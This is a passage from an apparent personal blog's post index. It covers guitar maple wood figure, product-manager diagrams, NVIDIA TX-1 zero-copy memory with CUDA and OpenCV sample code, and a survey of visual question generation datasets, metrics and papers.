<p>我们Les Paul爱好者最喜欢的木材种类是“起伏的生长”。一些在径向平面上是波浪形的，而一些在切向平面上是波浪形的。 起伏生长的原因追溯到细胞分裂和增大的方法。 波动的生长对观察者来说似乎是由纤维结构产生的光和暗区域的可移动条纹或对比斑块的光学错觉。 由木材中起伏纹造成的图像类似于在某些宝石中形成的条纹。 图也是部分地由于光线照射包含在图案木材中的细的起伏的纤维元件而产生的干涉图案的结果。</p>
<p>当木材的径向表面显示波状生长或颗粒时，切向面是光滑的，并且可以观察到波状或起伏的颗粒，但是触摸不明显。 当具有卷曲纹的木材部分分裂时，其沿着光线并沿着波纹状颗粒分离，并且表现为在径向表面上可以看到和感觉到的波纹状表面。 起伏的生长是在同一时间开始的单个细胞的延长的结果，其有些延迟，导致一些比其它细胞长。 </p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>Maple</tag>
      </tags>
  </entry>
  <entry>
    <title>假装自己是个产品经理</title>
    <url>/post/to-be-a-PM/</url>
    <content><![CDATA[<p>翻出了去年工程管理那边十二五结题时，帮他们画的图。百度了一下午，照猫画虎，闭门造车而成（不得不吐槽一下他们搞些课题，几个博士论文一凑，并没有什么研究，也没有什么价值，感觉纯属骗钱。）</p>
<p><img src="http://qiniu.s1nh.org/Blog_PM_%E7%BB%93%E6%9E%84%E5%9B%BE.png-QNthin"></p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_PM_%E5%8A%9F%E8%83%BD%E5%9B%BE.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_PM_%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A72.jpg-QNthin" title="用例"></p>
<p><img src="http://qiniu.s1nh.org/Blog_PM_%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A73.jpg-QNthin" title="数据流图"></p>
<p><img src="http://qiniu.s1nh.org/Blog_PM_%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A74.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>产品经理</tag>
        <tag>BIM</tag>
      </tags>
  </entry>
  <entry>
    <title>NVIDIA TX-1 的零拷贝(Zero Copy)和分页锁定内存(Pinned Memory)</title>
    <url>/post/tx-1-zero-copy/</url>
    <content><![CDATA[<blockquote>
<p>公司发的圣诞礼物被一个自以为是的胖女人拿走了，不开心</p>
</blockquote>
<p>众所周知GPGPU的性能瓶颈为PCI-E传输速度，数据传输时会导致运算资源闲置。因此NVIDIA发明了一个很牛逼的技术<code>Zero Copy</code>，它把主机内存直接映射到GPU内存上，在GPU需要数据时直接从主机内存寻找，隐式的传输到GPU中。还有另一个技术叫<code>Pinned Memory</code>，会在产生一个不会被分页的内存，这块内存不会被交换到磁盘的虚拟内存上，内存地址也不会被重新定位，因此，相比普通的<code>Pageable Memory</code>有更高的速度。使用Pinned Memory是一定会提高性能的，不过也需要适当使用，否则太多Pinned Memory会把Host Memory给挤爆了（因为它不会分页到虚拟内存去）。<br><img src="http://qiniu.s1nh.org/Blog_pageable_pinned_memory.png-QNthin" alt="图1 Pageable 和 Pinned 的区别" title="图1 Pageanbe 和 Pinned 的区别"></p>
<span id="more"></span>

<h2 id="0x00-Zero-Copy"><a href="#0x00-Zero-Copy" class="headerlink" title="0x00 Zero Copy"></a>0x00 Zero Copy</h2><p>对于普通的GPU使用Zero Copy以后，读取的数据速度限制为PCI-E的速度，所以不适用于频繁读取数据的程序，直到 NVIDIA TX-1（TK-1）的出现。在TX-1中，CPU/GPU共享memory（如图2 Integrated GPU，图3 更详细的展示了TX-1 的架构），使用Zero Copy的速度与cudaMalloc开辟的内存的速度一样！在这种情况下，Zero Copy会完全节省掉内存传输时间，特别对于流媒体的应用效果显著。</p>
<p><img src="http://qiniu.s1nh.org/Blog_zero-copy-discrete-integrated-GPU.png-QNthin" alt="图2 Discrete GPU, Integrated GPU" title="图2 Discrete GPU, Integrated GPU"></p>
<p><img src="http://qiniu.s1nh.org/Blog_zero-copy-TX1-architecture.png-QNthin" alt="图3 TX-1 架构" title="图3 TX-1 架构"></p>
<p>但是事情真的像我们想像中的这么完美吗？</p>
<p>Zero Copy<code>不通过GPU缓存</code>直接从内存中读取数据（图4），没有缓存的后果显而易见，有些时候（比如反复读取同一块数据）反而会导致性能下降。来自nvidia devtalk的帖子[<a href="https://devtalk.nvidia.com/default/topic/810053/jetson-tk1/opencv-performance-tk1/post/4479121/#4479121">1</a>,<a href="https://devtalk.nvidia.com/default/topic/922626/jetson-tx1/regarding-usage-of-zero-copy-on-tx1-to-improve-performance/post/4834970/#4834970">2</a>]解释了这个问题，文献[<a href="http://www.swisst.net/files/swisstnet/de/dokumente/ECC/ECC16/Referate/S4R2_Matthias%20Rosenthal.pdf">3</a>,<a href="https://cs.unc.edu/~anderson/papers/rtas17b.pdf">4</a>]做了详细实验。</p>
<p><img src="http://qiniu.s1nh.org/Blog_zero-copy-TX1-zero-copy.png-QNthin" alt="图4 TX-1 zero copy" title="图4 TX-1 zero copy绕过了GPU缓存"></p>
<h2 id="0x01-Zero-Copy-的-CUDA-实现"><a href="#0x01-Zero-Copy-的-CUDA-实现" class="headerlink" title="0x01 Zero Copy 的 CUDA 实现"></a>0x01 Zero Copy 的 CUDA 实现</h2><p><strong>1.标准的CUDA Pipeline：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Host Arrays</span><br><span class="line">float* h_in  &#x3D; new float[sizeIn];</span><br><span class="line">float* h_out &#x3D; new float[sizeOut];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Process h_in</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Device arrays</span><br><span class="line">float *d_out, *d_in;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Allocate memory on the device</span><br><span class="line">cudaMalloc((void **) &amp;d_in,  sizeIn ));</span><br><span class="line">cudaMalloc((void **) &amp;d_out, sizeOut));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Copy array contents of input from the host (CPU) to the device (GPU)</span><br><span class="line">cudaMemcpy(d_in, h_in, sizeX * sizeY * sizeof(float), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Launch the GPU kernel</span><br><span class="line">kernel&lt;&lt;&lt;blocks, threads&gt;&gt;&gt;(d_out, d_in);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Copy result back</span><br><span class="line">cudaMemcpy(h_out, d_out, sizeOut, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Continue processing on host using h_out</span><br></pre></td></tr></table></figure>

<p><strong>零拷贝的CUDA pipeline：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Set flag to enable zero copy access</span><br><span class="line">cudaSetDeviceFlags(cudaDeviceMapHost);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Host Arrays</span><br><span class="line">float* h_in  &#x3D; NULL;</span><br><span class="line">float* h_out &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Process h_in</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Allocate host memory using CUDA allocation calls</span><br><span class="line">cudaHostAlloc((void **)&amp;h_in,  sizeIn,  cudaHostAllocMapped);</span><br><span class="line">cudaHostAlloc((void **)&amp;h_out, sizeOut, cudaHostAllocMapped);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Device arrays</span><br><span class="line">float *d_out, *d_in;</span><br><span class="line">&#x2F;&#x2F; Get device pointer from host memory. No allocation or memcpy</span><br><span class="line">cudaHostGetDevicePointer((void **)&amp;d_in,  (void *) h_in , 0);</span><br><span class="line">cudaHostGetDevicePointer((void **)&amp;d_out, (void *) h_out, 0);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Launch the GPU kernel</span><br><span class="line">kernel&lt;&lt;&lt;blocks, threads&gt;&gt;&gt;(d_out, d_in);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; No need to copy d_out back</span><br><span class="line">&#x2F;&#x2F; Continue processing on host using h_out</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Zero-Copy-的-OpenCV-实现"><a href="#0x02-Zero-Copy-的-OpenCV-实现" class="headerlink" title="0x02 Zero Copy 的 OpenCV 实现"></a>0x02 Zero Copy 的 OpenCV 实现</h2><p><strong>1. OpenCV 3</strong></p>
<p>OpenCV3可以使用<code>cv::cuda::HostMem</code>来使用ZeroCopy和Pinned Memory，</p>
<ul>
<li><strong>PAGE_LOCKED:</strong> sets a page locked memory type used commonly for fast and asynchronous uploading/downloading data from/to GPU.</li>
<li><strong>SHARED:</strong> specifies a zero copy memory allocation that enables mapping the host memory to GPU address space, if supported.</li>
<li><strong>WRITE_COMBINED:</strong> sets the write combined buffer that is not cached by CPU. Such buffers are used to supply GPU with data when GPU only reads it. The advantage is a better CPU cache utilization.</li>
</ul>
<p>详细参见：<a href="http://docs.opencv.org/master/d0/d44/classcv_1_1cuda_1_1HostMem.html">cv::cuda::HostMem Class Reference
</a></p>
<p><strong>2. OpenCV 2</strong></p>
<p>Regular cv::gpu::GpuMat<br>cv::gpu::CudaMem with ALLOC_ZEROCOPY</p>
<p>从这抄了一段代码<a href="https://github.com/Error323/gpumat-tk1">https://github.com/Error323/gpumat-tk1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;opencv2&#x2F;opencv.hpp&gt;</span><br><span class="line">#include &lt;opencv2&#x2F;gpu&#x2F;gpu.hpp&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;timer.h&quot;</span><br><span class="line"></span><br><span class="line">#define ITERS 100</span><br><span class="line"></span><br><span class="line">using namespace cv;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void compute(gpu::GpuMat &amp;in, gpu::GpuMat &amp;bgr, gpu::GpuMat &amp;out)</span><br><span class="line">&#123;</span><br><span class="line">  cv::gpu::demosaicing(in, bgr, cv::COLOR_BayerBG2BGR);</span><br><span class="line">  cv::gpu::resize(bgr, out, out.size());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">  int w &#x3D; 4608;</span><br><span class="line">  int h &#x3D; 3288;</span><br><span class="line">  int wnew &#x3D; 800;</span><br><span class="line">  int hnew &#x3D; 600;</span><br><span class="line"></span><br><span class="line">  Mat in(h, w, CV_8UC1);</span><br><span class="line">  Mat out(hnew, wnew, CV_8UC3);</span><br><span class="line">  gpu::GpuMat d_in;</span><br><span class="line">  gpu::GpuMat d_bgr(h, w, CV_8UC3);</span><br><span class="line">  gpu::GpuMat d_out(hnew, wnew, CV_8UC3);</span><br><span class="line"></span><br><span class="line">  double t &#x3D; GetRealTime();</span><br><span class="line">  for (int i &#x3D; 0; i &lt; ITERS; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    in.setTo(i);</span><br><span class="line">    d_in.upload(in);</span><br><span class="line">    compute(d_in, d_bgr, d_out);</span><br><span class="line">    d_out.download(out);</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; &quot;Old Time: &quot; &lt;&lt; GetRealTime()-t &lt;&lt; &quot; (&quot; &lt;&lt; cv::sum(out)[0] &lt;&lt; &quot;)&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  gpu::CudaMem c_in(h, w, CV_8UC1, gpu::CudaMem::ALLOC_ZEROCOPY);</span><br><span class="line">  gpu::CudaMem c_out(hnew, wnew, CV_8UC3, gpu::CudaMem::ALLOC_ZEROCOPY);</span><br><span class="line">  d_in &#x3D; c_in.createGpuMatHeader();</span><br><span class="line">  d_out &#x3D; c_out.createGpuMatHeader();</span><br><span class="line">  out &#x3D; c_out.createMatHeader();</span><br><span class="line"></span><br><span class="line">  t &#x3D; GetRealTime();</span><br><span class="line">  for (int i &#x3D; 0; i &lt; ITERS; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    d_in.setTo(i);</span><br><span class="line">    compute(d_in, d_bgr, d_out);</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; &quot;New Time: &quot; &lt;&lt; GetRealTime()-t &lt;&lt; &quot; (&quot; &lt;&lt; cv::sum(out)[0] &lt;&lt; &quot;)&quot; &lt;&lt; endl;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://devtalk.nvidia.com/default/topic/810053/jetson-tk1/opencv-performance-tk1/post/4479121/#4479121">[1]OpenCV Performance TK1</a><br><a href="https://devtalk.nvidia.com/default/topic/922626/jetson-tx1/regarding-usage-of-zero-copy-on-tx1-to-improve-performance/post/4834970/#4834970">[2]Regarding Usage of Zero Copy on TX1 to improve performance</a><br><a href="http://www.swisst.net/files/swisstnet/de/dokumente/ECC/ECC16/Referate/S4R2_Matthias%20Rosenthal.pdf">[3]PPT: General purpose processing using embedded  GPUs: A study of latency and its variation</a><br><a href="https://cs.unc.edu/~anderson/papers/rtas17b.pdf">[4]An Evaluation of the NVIDIA TX1 for Supporting Real-timeComputer-Vision Workloads</a><br><a href="https://gold.xitu.io/entry/575692ba816dfa005f87fbfb">NVIDIA Tegra TK/X 系列板子的零拷贝 (zero copy) 问题</a><br><a href="http://www.findspace.name/easycoding/1349">Cuda锁页内存和零复制</a><br><a href="http://www.tuicool.com/articles/zmEn2q">CUDA零复制内存</a><br><a href="http://blog.csdn.net/langb2014/article/details/51348616">CUDA学习笔记九</a><br><a href="http://www.cnblogs.com/biglucky/p/4305131.html">CPU和GPU内存交互</a></p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>TX-1</tag>
      </tags>
  </entry>
  <entry>
    <title>A Survey of Visual Question Generation</title>
    <url>/post/vqg-survey/</url>
    <content><![CDATA[<img src="http://qiniu.s1nh.org/vqg-intro.svg" width = 70% div align=center />


<p>Give an image, the task is to generate natural Question based on the image.</p>
<ul>
<li>Another list of VQA <a href="https://github.com/jokieleung/awesome-visual-question-answering">https://github.com/jokieleung/awesome-visual-question-answering</a></li>
<li>A survey of Image Caption in Chinese <a href="https://zhuanlan.zhihu.com/p/27771046">https://zhuanlan.zhihu.com/p/27771046</a></li>
<li>Survey of the State of the Art in Natural Language Generation: Core tasks, applications and evaluation [<a href="https://www.researchgate.net/profile/Albert_Gatt/publication/315696017_Survey_of_the_State_of_the_Art_in_Natural_Language_Generation_Core_tasks_applications_and_evaluation/links/58e4909caca272d62977a6b8/Survey-of-the-State-of-the-Art-in-Natural-Language-Generation-Core-tasks-applications-and-evaluation.pdf">Link</a></li>
</ul>
<span id="more"></span>

<h2 id="0x01-Datasets"><a href="#0x01-Datasets" class="headerlink" title="0x01. Datasets"></a>0x01. Datasets</h2><h4 id="I-VQA"><a href="#I-VQA" class="headerlink" title="I. VQA"></a>I. <a href="http://visualqa.org/">VQA</a></h4><blockquote>
<p>Antol, Stanislaw, et al. “<strong>Vqa: Visual question answering.</strong>“ <em>Proceedings of the IEEE international conference on computer vision.</em> 2015.</p>
<p>Zhang, Peng, et al. “<strong>Yin and yang: Balancing and answering binary visual questions.</strong>“ <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition.</em> 2016.</p>
<p>Goyal, Yash, et al. “<strong>Making the V in VQA matter: Elevating the role of image understanding in Visual Question Answering.</strong>“ <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition.</em> 2017.</p>
</blockquote>
<p>VQA is a new dataset containing open-ended questions about images. These questions require an understanding of vision, language and commonsense knowledge to answer.</p>
<ul>
<li>265,016 images (COCO and abstract scenes)</li>
<li>At least 3 questions (5.4 questions on average) per image</li>
<li>10 ground truth answers per question</li>
<li>3 plausible (but likely incorrect) answers per question</li>
<li>Automatic evaluation metric</li>
</ul>
<h4 id="II-VQG-COCO-Bing-Flicker"><a href="#II-VQG-COCO-Bing-Flicker" class="headerlink" title="II.VQG-COCO/Bing/Flicker"></a>II.<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53670">VQG-COCO/Bing/Flicker</a></h4><blockquote>
<p>Mostafazadeh, Nasrin, et al. “<strong>Generating Natural Questions About an Image.</strong>“ <em>Proceedings of the 54th Annual Meeting of the Association for Computational Linguistics (Volume 1: Long Papers).</em> 2016.</p>
</blockquote>
<p>This dataset is described in <a href="http://aclanthology.info/papers/generating-natural-questions-about-an-image">http://aclanthology.info/papers/generating-natural-questions-about-an-image</a>. The dataset is comprised of 9 csv’s, organized first by the source of the image, Bing, MSCOCO, or Flickr, then by type of dataset, train, dev and test. Within each file, we organize by image_id, the link to the image, and the up to 5 natural questions authored by crowdworkers on Amazon Mechnical Turk in response to the image. Please be sure to maintain these files separately in order to report system accuracy and progress on dev and test sets. For the Bing images, the dataset includes up to 5 captions for each image link; captions for the COCO and Flickr images are available elsewhere. In addition, each of the test set files includes the human rating of the question necessary to compute the deltaBleu score (see <a href="http://aclanthology.info/papers/deltableu-a-discriminative-metric-for-generation-tasks-with-intrinsically-diverse-targets">http://aclanthology.info/papers/deltableu-a-discriminative-metric-for-generation-tasks-with-intrinsically-diverse-targets</a>).</p>
<h4 id="III-TextVQA"><a href="#III-TextVQA" class="headerlink" title="III. TextVQA"></a>III. <a href="https://textvqa.org/dataset">TextVQA</a></h4><h4 id="IV-Visual-Genome"><a href="#IV-Visual-Genome" class="headerlink" title="IV. Visual Genome"></a>IV. <a href="http://visualgenome.org/api/v0/api_home.html">Visual Genome</a></h4><h4 id="V-VizWiz"><a href="#V-VizWiz" class="headerlink" title="V. VizWiz"></a>V. <a href="https://vizwiz.org/">VizWiz</a></h4><h4 id="VI-Visual-Dialog"><a href="#VI-Visual-Dialog" class="headerlink" title="VI. Visual Dialog"></a>VI. <a href="https://visualdialog.org/">Visual Dialog</a></h4><h2 id="0x02-Researchers"><a href="#0x02-Researchers" class="headerlink" title="0x02. Researchers"></a>0x02. Researchers</h2><ul>
<li><p> Indian Institute of Technology, <a href="https://badripatro.github.io/index.html">Badri N. Patro</a> &amp; <a href="https://vinaypn.github.io/">Vinay P. Namboodiri</a> <em>这哥们近期发了6篇有关VQG/VQA的文章，其中三篇被录用，两篇已经开源（不过star很少）</em></p>
</li>
<li><p>Microsoft, <strong>Nan Duan</strong>, <strong>Duyu Tang</strong>, <strong>Tong Wang</strong>(Maluuba)</p>
</li>
<li><p>Google DeepMind, Oriol Vinyals</p>
</li>
<li><p>Nasrin Mostafazadeh</p>
</li>
<li><p>Alexander Toshev</p>
</li>
</ul>
<h2 id="0x03-Architecture"><a href="#0x03-Architecture" class="headerlink" title="0x03. Architecture"></a>0x03. Architecture</h2><h3 id="0-Rule-based-❌"><a href="#0-Rule-based-❌" class="headerlink" title="0. Rule-based ❌"></a>0. Rule-based ❌</h3><h3 id="1-GRNN"><a href="#1-GRNN" class="headerlink" title="1. GRNN"></a>1. GRNN</h3><p><code>2016 Microsoft</code></p>
<img src="http://qiniu.s1nh.org/vqg-traditional.svg" width = 70% div align=center />




<h3 id="2-IQ"><a href="#2-IQ" class="headerlink" title="2. IQ"></a>2. IQ</h3><p><strong>with VAE</strong>/<strong>maximizes mutual information</strong>/<strong>doesn’t need to know the expected answer</strong></p>
<img src="http://qiniu.s1nh.org/vqg-pipeline-full.svg" width = 90% div align=center  />


<p><strong>pipeline</strong></p>
<img src="http://qiniu.s1nh.org/vqg-iq-inference-full.svg" width = 90% div align=center />


<h2 id="0x04-Experiments"><a href="#0x04-Experiments" class="headerlink" title="0x04 Experiments"></a>0x04 Experiments</h2><p>pass</p>
<h2 id="0xFD-Metrics"><a href="#0xFD-Metrics" class="headerlink" title="0xFD Metrics"></a>0xFD Metrics</h2><ul>
<li><p><code>word-overlap metrics</code>  BLEU, METEOR, ROUGE etc.</p>
</li>
<li><p><code>embedding-based metrics</code>  Skip-Thought, Embedding average, Vector extrema, Greedy matching etc.</p>
</li>
</ul>
<h3 id="1-Word-overlap-metrics"><a href="#1-Word-overlap-metrics" class="headerlink" title="1. Word-overlap metrics"></a>1. Word-overlap metrics</h3><h4 id="1-1-BLEU"><a href="#1-1-BLEU" class="headerlink" title="1.1. BLEU"></a>1.1. BLEU</h4><p><code>Widely used in the machine translation literature.</code></p>
<p><strong>Feature</strong></p>
<ul>
<li>Focus on precision, don’t care about recall.</li>
<li>Regardless of word order.</li>
</ul>
<p><strong>Math</strong></p>
<p>First compute brevity penalty BP shows below:</p>
<p>$$BP=\begin{cases}<br>1, &amp;if \ c &gt; r\<br>e^{\ (\ 1 - r / c\ )}, &amp;if \ c&lt;r<br>\end{cases}$$</p>
<p>Where c is the total length of the candidate translation corpus, and r is the effective reference corpus length.</p>
<p>Next, compute the geometric average of the modified <strong>n-gram precisions</strong>, $p_n$, using n-grams up to length N and positive weights $w_n$ summing to one.</p>
<p>Then, BELU is shown below:</p>
<p>$$BLEU = BP \cdot exp\left(\sum_{n=1}^N w_n \log p_n\right)$$</p>
<p>Where $exp\left(\sum_{n=1}^N w_n \log p_n\right)$ represents the weighted sum of the logarithms of the accuracy of different n-grams</p>
<p>And the ranking behavior is more immediately apparent in the log domain.</p>
<p>$$log \ BLEU = min(1-\frac{r}{c},0) + \sum_{n=1}^N w_n \log p_n$$</p>
<p><strong>Ref.</strong><br>[<a href="https://www.aclweb.org/anthology/P02-1040.pdf">1</a>] [<a href="https://machinelearningmastery.com/calculate-bleu-score-for-text-python/">2</a>]</p>
<h4 id="1-2-ROUGE"><a href="#1-2-ROUGE" class="headerlink" title="1.2. ROUGE"></a>1.2. ROUGE</h4><p><code>Is almost same as BLEU, but caculate recall instead of precision.</code></p>
<h4 id="1-3-METOR"><a href="#1-3-METOR" class="headerlink" title="1.3. METOR"></a>1.3. METOR</h4><p><code>Not only based on exact matches but also stem, synonym, and paraphrase matches.</code></p>
<h3 id="2-Embedding-based-metrics"><a href="#2-Embedding-based-metrics" class="headerlink" title="2. Embedding-based metrics"></a>2. Embedding-based metrics</h3><ul>
<li>Skip-Thought</li>
<li>Embedding average</li>
<li>Vector extrema</li>
<li>Greedy matching</li>
</ul>
<h2 id="0xFD"><a href="#0xFD" class="headerlink" title="0xFD"></a>0xFD</h2><ul>
<li><a href="https://ijdykeman.github.io/ml/2016/12/21/cvae.html">Conditional Variational Autoencoders</a> (<a href="https://www.cnblogs.com/wangxiaocvpr/p/6231019.html">in chinese</a>)</li>
</ul>
<h3 id="0xFE-Open-Source-Project"><a href="#0xFE-Open-Source-Project" class="headerlink" title="0xFE. Open Source Project"></a>0xFE. Open Source Project</h3><p><strong>VQA:</strong></p>
<ul>
<li><a href="https://github.com/facebookresearch/pythia">Pythia</a> (<a href="https://colab.research.google.com/drive/1Z9fsh10rFtgWe4uy8nvU4mQmqdokdIRR">Demo</a>)</li>
<li><a href="https://delta-lab-iitk.github.io/U-CAM/">U-CAM</a></li>
</ul>
<p><strong>VQG: (sorted by stars)</strong></p>
<ul>
<li><a href="https://github.com/yikang-li/iQAN">iQAN (CVPR 2018)</a></li>
<li><a href="https://github.com/chingyaoc/VQG-tensorflow">VQG 1 (ACL 2016, unofficial)</a></li>
<li><a href="https://github.com/naver/aqm-plus">AQM+ (ICLR 2019)</a></li>
<li><a href="https://github.com/ranjaykrishna/iq">IQ (CVPR 2019)</a></li>
<li><a href="https://github.com/badripatro/Visual_Question_Generation">MDNVQG (EMNLP 2018)</a></li>
<li><a href="https://github.com/chennaveh/VQG">VQG 2 (ACL 2016, unofficial)</a></li>
<li><a href="https://github.com/gitlost-murali/Natural-Questions-Generation-from-Images">VQG 3 (ACL 2016, unofficial)</a></li>
<li><a href="https://github.com/danishnxt/NLP-Project-VisualQuesGen">VQG 4 (ACL 2016, unofficial)</a></li>
</ul>
<h3 id="0xFF-Papers-sorted-by-date"><a href="#0xFF-Papers-sorted-by-date" class="headerlink" title="0xFF. Papers (sorted by date)"></a>0xFF. Papers (sorted by date)</h3><ul>
<li><p>Gao, J., Galley, M., &amp; Li, L. (2019). <strong>Neural approaches to conversational ai.</strong> Foundations and Trends® in Information Retrieval, 13(2-3), 127-298.[<a href="http://research.baidu.com/Public/ueditor/upload/file/20181029/1540796086725537.pdf">Poster</a>] [<a href="https://arxiv.org/pdf/1809.08267.pdf">Paper</a>]</p>
</li>
<li><p><strong>Patro, B. N.</strong>, Kurmi, V., Kumar, S., &amp; Namboodiri, V. (2020). <strong>Deep Bayesian Network for Visual Question Generation.</strong> In The IEEE Winter Conference on Applications of Computer Vision (pp. 1566-1576).</p>
</li>
<li><p><strong>Patro, B. N.</strong>, Patel, S., &amp; Namboodiri, V. P. (2019). <strong>Granular Multimodal Attention Networks for Visual Dialog.</strong> arXiv preprint arXiv:1910.05728.[<a href="http://xxx.itp.ac.cn/pdf/1910.05728.pdf">Paper</a>]</p>
</li>
<li><p><strong>Patro, B. N.</strong>, Lunayach, M., Patel, S., &amp; Namboodiri, V. P. (2019). <strong>U-cam: Visual explanation using uncertainty based class activation maps.</strong> In Proceedings of the IEEE International Conference on Computer Vision (pp. 7444-7453). [<a href="http://openaccess.thecvf.com/content_ICCV_2019/papers/Patro_U-CAM_Visual_Explanation_Using_Uncertainty_Based_Class_Activation_Maps_ICCV_2019_paper.pdf">Paper</a>] [<a href="https://delta-lab-iitk.github.io/U-CAM/">Proj</a>] [<a href="https://github.com/DelTA-Lab-IITK/U-CAM">code</a>]</p>
</li>
<li><p><strong>Patro, B. N.</strong>, &amp; Namboodiri, V. P. (2019). <strong>Deep Exemplar Networks for VQA and VQG.</strong> arXiv preprint arXiv:1912.09551.</p>
</li>
<li><p><strong>Patro, B. N.</strong>, &amp; Namboodiri, V. P. (2019). <strong>Probabilistic framework for solving Visual Dialog.</strong> arXiv preprint arXiv:1909.04800.[<a href="https://arxiv.org/pdf/1909.04800.pdf">Paper</a>]</p>
</li>
<li><p>Lee, S. W., Gao, T., Yang, S., Yoo, J., &amp; Ha, J. W. (2019). <strong>Large-Scale Answerer in Questioner’s Mind for Visual Dialog Question Generation.</strong> ICLR 2019.[<a href="https://arxiv.org/pdf/1902.08355">Paper</a>] [<a href="https://github.com/naver/aqm-plus">code</a>]</p>
</li>
<li><p>Jedoui, K., Krishna, R., Bernstein, M., &amp; Fei-Fei, L. (2019). <strong>Deep Bayesian Active Learning for Multiple Correct Outputs.</strong> arXiv preprint arXiv:1912.01119.</p>
</li>
<li><p>Krishna, R., Bernstein, M., &amp; Fei-Fei, L. (2019). <strong>Information maximizing visual question generation.</strong> In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (pp. 2008-2018).[<a href="http://openaccess.thecvf.com/content_CVPR_2019/papers/Krishna_Information_Maximizing_Visual_Question_Generation_CVPR_2019_paper.pdf">Paper</a>] [<a href="https://cs.stanford.edu/people/ranjaykrishna/iq/index.html">Proj</a>] [<a href="https://github.com/ranjaykrishna/iq">Code</a>]</p>
</li>
<li><p>Fan, Z., Wei, Z., Wang, S., Liu, Y., &amp; Huang, X. J. (2018, August). A reinforcement learning framework for natural question generation using bi-discriminators. In Proceedings of the 27th International Conference on Computational Linguistics (pp. 1763-1774).[<a href="https://www.aclweb.org/anthology/C18-1150.pdf">Paper</a>]</p>
</li>
<li><p><strong>Patro, B. N.</strong>, Kumar, S., Kurmi, V. K., &amp; Namboodiri, V. P. (2018). <strong>Multimodal differential network for visual question generation.</strong> In Proceedings of the 2018 Conference on Empirical Methods in Natural Language Processing (pp. 4002-4012). [<a href="http://aclweb.org/anthology/D18-1434">Paper</a>]. [<a href="https://badripatro.github.io/MDN-VQG/">Project Link</a>] [<a href="https://github.com/badripatro/Visual_Question_Generation">code</a>]</p>
</li>
<li><p>[49] Li, Y., <strong>Duan, N.</strong>, Zhou, B., Chu, X., Ouyang, W., Wang, X., &amp; Zhou, M. (2018). <strong>Visual question generation as dual task of visual question answering.</strong> In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (pp. 6116-6124). [<a href="https://arxiv.org/abs/1709.07192">Paper</a>] [<a href="https://github.com/yikang-li/iQAN">code</a>]</p>
</li>
<li><p>[362] Das, A., Kottur, S., Gupta, K., Singh, A., Yadav, D., Moura, J. M., … &amp; Batra, D. (2017). <strong>Visual dialog.</strong> In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (pp. 326-335).</p>
</li>
<li><p>Zhang, J., Wu, Q., Shen, C., Zhang, J., Lu, J., &amp; Hengel, A. V. D. (2017). <strong>Asking the difficult questions: Goal-oriented visual question generation via intermediate rewards.</strong> arXiv preprint arXiv:1711.07614. [<a href="https://arxiv.org/abs/1711.07614">Paper</a>]</p>
</li>
<li><p>[41] <strong>Wang, T.</strong>, Yuan, X., &amp; Trischler, A. (2017). <strong>A joint model for question answering and question generation.</strong> arXiv preprint arXiv:1706.01450.</p>
</li>
<li><p>[59] Tang, D., <strong>Duan, N.</strong>, Qin, T., Yan, Z., &amp; Zhou, M. (2017). Question answering and question generation as dual tasks. arXiv preprint arXiv:1706.02027.</p>
</li>
<li><p>[65] Jain, U., Zhang, Z., &amp; Schwing, A. G. (2017). <strong>Creativity: Generating diverse questions using variational autoencoders.</strong> In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (pp. 6485-6494). [<a href="https://arxiv.org/abs/1704.03493">Paper</a>].</p>
</li>
